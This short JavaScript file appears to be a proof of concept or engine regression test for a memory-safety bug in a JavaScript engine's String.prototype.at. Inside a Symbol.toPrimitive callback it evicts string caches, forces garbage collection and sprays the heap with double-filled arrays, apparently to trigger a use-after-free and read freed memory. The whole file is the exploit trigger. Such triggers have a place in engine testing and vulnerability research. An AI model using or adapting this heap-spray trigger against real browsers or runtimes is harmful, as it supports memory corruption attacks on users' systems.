const atom = "A".repeat(128);
const dummy = {};
Reflect.set(dummy, atom, 1);

const victim = "A".repeat(128);
let cacheEvict = "D".repeat(64) + "D".repeat(64);
String.prototype.at.call(cacheEvict, 0);

let spray;
const index = {
    [Symbol.toPrimitive]() {
        Reflect.set(dummy, victim, 1);
        Reflect.set(dummy, cacheEvict, 1);
        gc();

        spray = [];
        for (let i = 0; i < 10000; ++i) {
            const a = new Array(16);
            a.fill(13.37);
            spray.push(a);
        }
        return 0;
    }
};

print(String.prototype.at.call(victim, index).charCodeAt(0));
